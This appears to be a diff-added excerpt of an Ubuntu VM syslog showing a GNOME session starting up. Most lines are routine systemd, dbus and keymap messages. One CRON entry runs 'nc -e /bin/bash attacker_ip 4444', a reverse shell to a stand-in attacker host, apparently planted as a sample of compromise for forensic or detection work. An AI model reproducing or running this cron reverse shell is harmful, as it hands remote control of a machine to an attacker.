+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Color.target - GNOME color management target.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Keyboard.target - GNOME keyboard configuration target.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: The XKEYBOARD keymap compiler (xkbcomp) reports:
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86CameraAccessEnable
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86CameraAccessDisable
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86CameraAccessToggle
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86NextElement
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86PreviousElement
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86AutopilotEngageToggle
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86MarkWaypoint
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86Sos
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86NavChart
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86FishingChart
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86SingleRangeRadar
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86DualRangeRadar
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86RadarOverlay
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86TraditionalSonar
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86ClearvuSonar
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86SidevuSonar
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: > Warning:          Could not resolve keysym XF86NavInfo
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.MediaKeys.service - GNOME keyboard shortcuts service.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.MediaKeys.target - GNOME keyboard shortcuts target.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2347]: Errors from xkbcomp are not fatal to the X server
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Power.service - GNOME power management service.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Power.target - GNOME power management target.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 polkitd[720]: Unregistered Authentication Agent for unix-session:c1 (system bus name :1.40, object path /org/freedesktop/PolicyKit1/AuthenticationAgent, locale en_US.UTF-8) (disconnected from bus)
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: session-c1.scope: Deactivated successfully.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: session-c1.scope: Consumed 8.513s CPU time.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd-logind[733]: Removed session c1.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.Wacom.service - GNOME Wacom tablet support service.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target org.gnome.SettingsDaemon.Wacom.target - GNOME Wacom tablet support target.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session.target - GNOME Session.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session-wayland@ubuntu.target - GNOME Wayland Session (session: ubuntu).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target graphical-session.target - Current graphical user session.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: gnome-initial-setup-first-login.service - GNOME Initial Setup was skipped because of an unmet condition check (ConditionPathExists=!/home/vmuser/.config/gnome-initial-setup-done).
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting tracker-miner-fs-3.service - Tracker file system data miner...
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1843 of process 1821 owned by '1000' high priority at nice level 0.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 15 threads of 9 processes of 2 users.
+Apr 13 14:56:55 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 14 threads of 8 processes of 2 users.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 14 threads of 8 processes of 2 users.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Successfully made thread 1843 of process 1821 owned by '1000' RT at priority 20.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 15 threads of 9 processes of 2 users.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Launching DING process
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd-timesyncd[550]: Contacted time server 185.125.190.58:123 (ntp.ubuntu.com).
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd-timesyncd[550]: Initial clock synchronization to Mon 2026-04-13 14:56:56.129090 CDT.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating service name='org.gnome.ScreenSaver' requested by ':1.45' (uid=1000 pid=1944 comm="/usr/libexec/gsd-power" label="unconfined")
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session-x11-services.target - GNOME session X11 services.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting org.gnome.SettingsDaemon.XSettings.service - GNOME XSettings service...
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: The XKEYBOARD keymap compiler (xkbcomp) reports:
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Unsupported maximum keycode 708, clipping.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: >                   X11 cannot support keycodes above 255.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86CameraAccessEnable
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gsd-media-keys[1943]: Failed to grab accelerator for keybinding settings:playback-repeat
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gsd-media-keys[1943]: Failed to grab accelerator for keybinding settings:hibernate
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86CameraAccessDisable
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86CameraAccessToggle
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86NextElement
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86PreviousElement
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86AutopilotEngageToggle
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86MarkWaypoint
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86Sos
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86NavChart
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86FishingChart
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86SingleRangeRadar
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86DualRangeRadar
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86RadarOverlay
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86TraditionalSonar
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86ClearvuSonar
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86SidevuSonar
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: > Warning:          Could not resolve keysym XF86NavInfo
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2401]: Errors from xkbcomp are not fatal to the X server
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.freedesktop.portal.Desktop' unit='xdg-desktop-portal.service' requested by ':1.79' (uid=1000 pid=2298 comm="/usr/bin/nautilus --gapplication-service" label="nautilus (unconfined)")
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting xdg-desktop-portal.service - Portal service...
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.ScreenSaver'
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.freedesktop.impl.portal.desktop.gnome' unit='xdg-desktop-portal-gnome.service' requested by ':1.89' (uid=1000 pid=2410 comm="/usr/libexec/xdg-desktop-portal" label="unconfined")
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting xdg-desktop-portal-gnome.service - Portal service (GNOME implementation)...
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.freedesktop.impl.portal.desktop.gnome'
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started xdg-desktop-portal-gnome.service - Portal service (GNOME implementation).
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 15 threads of 9 processes of 2 users.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 15 threads of 9 processes of 2 users.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 rtkit-daemon[1068]: Supervising 15 threads of 9 processes of 2 users.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.freedesktop.impl.portal.desktop.gtk' unit='xdg-desktop-portal-gtk.service' requested by ':1.89' (uid=1000 pid=2410 comm="/usr/libexec/xdg-desktop-portal" label="unconfined")
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gtk.vfs.Metadata' unit='gvfs-metadata.service' requested by ':1.87' (uid=1000 pid=2377 comm="gjs /usr/share/gnome-shell/extensions/ding@rasters" label="desktop-icons-ng (unconfined)")
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gvfs-metadata.service - Virtual filesystem metadata service...
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting xdg-desktop-portal-gtk.service - Portal service (GTK/GNOME implementation)...
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: Detected async api for thumbnails
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gtk.vfs.Metadata'
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gvfs-metadata.service - Virtual filesystem metadata service.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: (gjs:2377): Gjs-WARNING **: 14:56:56.962: GLib.unix_signal_add has been moved to a separate platform-specific library. Please update your code to use GLibUnix.signal_add instead.
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: 0 DesktopManager() ["/usr/share/gnome-shell/extensions/ding@rastersoft.com/app/desktopManager.js":264:12]
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: 1 anonymous() ["/usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js":180:25]
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: 2 anonymous() ["/usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js":197:20]
+Apr 13 14:56:56 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: 3 <TOP LEVEL> ["/usr/share/gnome-shell/extensions/ding@rastersoft.com/app/ding.js":206:12]
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: DBus interface for Switcheroo control (net.hadess.SwitcherooControl) is now available.
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: DBus interface for Gvfs daemon (org.gtk.vfs.Metadata) is now available.
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started org.gnome.SettingsDaemon.XSettings.service - GNOME XSettings service.
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Reached target gnome-session-x11-services-ready.target - GNOME session X11 services.
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 org.gnome.Shell.Screencast[1923]: Xlib:  extension "DRI2" missing on display ":0".
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 tracker-miner-fs-3[2366]: Xlib:  extension "DRI2" missing on display ":0".
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: ** Message: 14:56:57.165: Connecting to org.freedesktop.Tracker3.Miner.Files
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: Received notification for window. 0 notifications remaining.
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2469]: libEGL warning: DRI3 error: Could not get DRI3 device
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[2469]: libEGL warning: Ensure your X server supports DRI3 to get accelerated rendering
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.freedesktop.impl.portal.desktop.gtk'
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started xdg-desktop-portal-gtk.service - Portal service (GTK/GNOME implementation).
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.freedesktop.portal.Desktop'
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started xdg-desktop-portal.service - Portal service.
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.freedesktop.Tracker3.Miner.Files' unit='tracker-miner-fs-3.service' requested by ':1.79' (uid=1000 pid=2298 comm="/usr/bin/nautilus --gapplication-service" label="nautilus (unconfined)")
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: DBus interface for Nautilus (org.gnome.Nautilus.FileOperations2) is now available.
+Apr 13 14:56:57 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: DBus interface for Nautilus (org.freedesktop.FileManager1) is now available.
+Apr 13 14:56:58 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: DING: GNOME nautilus 46.4
+Apr 13 14:56:59 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started app-gnome-org.gnome.Terminal-2488.scope - Application launched by gnome-shell.
+Apr 13 14:57:00 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Activating via systemd: service name='org.gnome.Terminal' unit='gnome-terminal-server.service' requested by ':1.103' (uid=1000 pid=2491 comm="/usr/bin/gnome-terminal.real" label="unconfined")
+Apr 13 14:57:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Created slice app-org.gnome.Terminal.slice - Slice /app/org.gnome.Terminal.
+Apr 13 14:57:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Starting gnome-terminal-server.service - GNOME Terminal Server...
+Apr 13 14:57:00 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.Terminal'
+Apr 13 14:57:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started gnome-terminal-server.service - GNOME Terminal Server.
+Apr 13 14:57:00 vmuser-Standard-PC-i440FX-PIIX-1996 gnome-shell[1821]: meta_window_set_stack_position_no_sync: assertion 'window->stack_position >= 0' failed
+Apr 13 14:57:00 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started vte-spawn-ea0f1ec4-a173-4063-b281-4f7aa08e739a.scope - VTE child process 2504 launched by gnome-terminal-server process 2497.
+Apr 13 14:57:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2512]: pam_unix(cron:session): session opened for user vmuser(uid=1000) by vmuser(uid=0)
+Apr 13 14:57:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2513]: (vmuser) CMD (nc -e /bin/bash attacker_ip 4444)
+Apr 13 14:57:01 vmuser-Standard-PC-i440FX-PIIX-1996 cron[2515]: sendmail: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 14:57:01 vmuser-Standard-PC-i440FX-PIIX-1996 postfix/sendmail[2515]: fatal: open /etc/postfix/main.cf: No such file or directory
+Apr 13 14:57:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2512]: (vmuser) MAIL (mailed 316 bytes of output but got status 0x004b from MTA
+                                                                )
+Apr 13 14:57:01 vmuser-Standard-PC-i440FX-PIIX-1996 CRON[2512]: pam_unix(cron:session): session closed for user vmuser
+Apr 13 14:57:04 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: systemd-timedated.service: Deactivated successfully.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Stopping user@120.service - User Manager for UID 120...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Activating special unit exit.target...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped target default.target - Main User Target.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopping dbus.service - D-Bus User Message Bus...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopping filter-chain.service - PipeWire filter chain daemon...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopping pipewire-pulse.service - PipeWire PulseAudio...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopping xdg-document-portal.service - flatpak document portal service...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopping xdg-permission-store.service - sandboxed app permission store...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped filter-chain.service - PipeWire filter chain daemon.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped dbus.service - D-Bus User Message Bus.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: run-user-120-doc.mount: Deactivated successfully.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped pipewire-pulse.service - PipeWire PulseAudio.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped xdg-document-portal.service - flatpak document portal service.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped xdg-permission-store.service - sandboxed app permission store.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 wireplumber[1049]: stopped by signal: Terminated
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 wireplumber[1049]: disconnected from pipewire
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopping wireplumber.service - Multimedia Service Session Manager...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped wireplumber.service - Multimedia Service Session Manager.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopping pipewire.service - PipeWire Multimedia Service...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped pipewire.service - PipeWire Multimedia Service.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Removed slice session.slice - User Core Session Slice.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped target basic.target - Basic System.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped target paths.target - Paths.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped ubuntu-report.path - Pending report trigger for Ubuntu Report.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped target sockets.target - Sockets.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped target timers.target - Timers.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped launchpadlib-cache-clean.timer - Clean up old files in the Launchpadlib cache.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopped snap.firmware-updater.firmware-notifier.timer - Timer firmware-notifier for snap application firmware-updater.firmware-notifier.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed dbus.socket - D-Bus User Message Bus Socket.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed dirmngr.socket - GnuPG network certificate management daemon.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed gcr-ssh-agent.socket - GCR ssh-agent wrapper.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed gnome-keyring-daemon.socket - GNOME Keyring daemon.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed gpg-agent-browser.socket - GnuPG cryptographic agent and passphrase cache (access for web browsers).
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed gpg-agent-extra.socket - GnuPG cryptographic agent and passphrase cache (restricted).
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Stopping gpg-agent-ssh.socket - GnuPG cryptographic agent (ssh-agent emulation)...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed gpg-agent.socket - GnuPG cryptographic agent and passphrase cache.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed keyboxd.socket - GnuPG public key management service.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed pipewire-pulse.socket - PipeWire PulseAudio.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed pipewire.socket - PipeWire Multimedia System Sockets.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed pk-debconf-helper.socket - debconf communication socket.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed snapd.session-agent.socket - REST API socket for snapd user session agent.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed speech-dispatcher.socket - Speech Dispatcher Socket.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Closed gpg-agent-ssh.socket - GnuPG cryptographic agent (ssh-agent emulation).
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Removed slice app.slice - User Application Slice.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Reached target shutdown.target - Shutdown.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Finished systemd-exit.service - Exit the Session.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1029]: Reached target exit.target - Exit the Session.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: user@120.service: Deactivated successfully.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Stopped user@120.service - User Manager for UID 120.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: user@120.service: Consumed 1.421s CPU time.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Stopping user-runtime-dir@120.service - User Runtime Directory /run/user/120...
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: run-user-120.mount: Deactivated successfully.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: user-runtime-dir@120.service: Deactivated successfully.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Stopped user-runtime-dir@120.service - User Runtime Directory /run/user/120.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: Removed slice user-120.slice - User Slice of UID 120.
+Apr 13 14:57:06 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: user-120.slice: Consumed 9.962s CPU time.
+Apr 13 14:57:10 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1]: fprintd.service: Deactivated successfully.
+Apr 13 14:57:11 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.gnome.Shell.Screencast'
+Apr 13 14:57:11 vmuser-Standard-PC-i440FX-PIIX-1996 dbus-daemon[1613]: [session uid=1000 pid=1613] Successfully activated service 'org.freedesktop.Tracker3.Miner.Files'
+Apr 13 14:57:11 vmuser-Standard-PC-i440FX-PIIX-1996 systemd[1590]: Started tracker-miner-fs-3.service - Tracker file system data miner.
